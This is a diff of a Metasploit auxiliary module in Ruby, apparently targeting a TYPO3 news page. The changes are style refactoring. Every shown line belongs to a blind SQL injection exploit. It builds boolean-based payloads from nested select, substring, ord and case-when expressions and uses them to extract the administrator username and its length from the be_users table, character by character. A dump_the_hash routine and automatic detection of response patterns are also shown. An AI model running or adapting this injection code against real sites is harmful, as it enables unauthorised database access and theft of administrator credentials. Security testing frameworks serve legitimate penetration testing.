@@ -65,23 +65,22 @@ class MetasploitModule < Msf::Auxiliary
     if pattern1 == '' or pattern2 == ''
       print_error("Impossible to determine pattern automatically, aborting...")
       return false
-    else
-      print_status("Testing injection...")
-      offset = 9
-      field = 'username'
-      table = 'be_users'
-      condition = 'uid=1'
-      digit_charset = "0".upto("9").to_a.join('')
-      patterns = {:pattern1 => pattern1, :pattern2 => pattern2}
-      size = blind_size(
-       "length(#{field})+#{offset}",
-       table,
-       condition,
-       2,
-       digit_charset,
-       patterns)
-      return size != ''
     end
+    print_status("Testing injection...")
+    offset = 9
+    field = 'username'
+    table = 'be_users'
+    condition = 'uid=1'
+    digit_charset = "0".upto("9").to_a.join('')
+    patterns = {:pattern1 => pattern1, :pattern2 => pattern2}
+    size = blind_size(
+      "length(#{field})+#{offset}",
+      table,
+      condition,
+      2,
+      digit_charset,
+      patterns)
+    return size != ''
   end
 
   def dump_the_hash(patterns = {})
@@ -116,22 +115,20 @@ class MetasploitModule < Msf::Auxiliary
      charset,
      patterns
     )
-    return data
   end
 
   def select_position(field, table, condition, position, char)
     payload1 = "select(#{field})from(#{table})where(#{condition})"
     payload2 = "ord(substring((#{payload1})from(#{position})for(1)))"
     payload3 = "uid*(case((#{payload2})=#{char.ord})when(1)then(1)else(-1)end)"
-    return payload3
   end
 
   def blind_size(field, table, condition, size, charset,  patterns = {})
     vprint_status("Retrieving field '#{field}' string (#{size} bytes) ...")
     str = ""
-    for position in 0..size
-      for char in charset.split('')
-        payload = select_position(field, table, condition, position + 1, char)
+    (1..size).each do |position|
+      charset.split('').each do |char|
+        payload = select_position(field, table, condition, position, char)
         #print_status(payload)
         if test(payload, patterns)
           str += char.to_s
@@ -140,7 +137,7 @@ class MetasploitModule < Msf::Auxiliary
         end
       end
     end
-    return str
+    str
   end
 
   def test(payload, patterns = {})
@@ -162,7 +159,7 @@ class MetasploitModule < Msf::Auxiliary
     return res.body.index(patterns[:pattern1]) < res.body.index(patterns[:pattern2])
   end
 
-  def try_autodetect_patterns()
+  def try_autodetect_patterns
     print_status("Trying to automatically determine Pattern1 and Pattern2...")
     res = send_request_cgi({
       'method'   => 'POST',
@@ -172,7 +169,7 @@ class MetasploitModule < Msf::Auxiliary
         'no_cache' => '1'
        }
     })
-    news = res.get_html_document.search('div[@itemtype="http://schema.org/Article"]');
+    news = res.get_html_document.search('div[@itemtype="http://schema.org/Article"]')
     if news.empty? or news.length < 2
       print_error("No enough news found on the page with specified id (at least 2 news are necessary)")
       return '',''
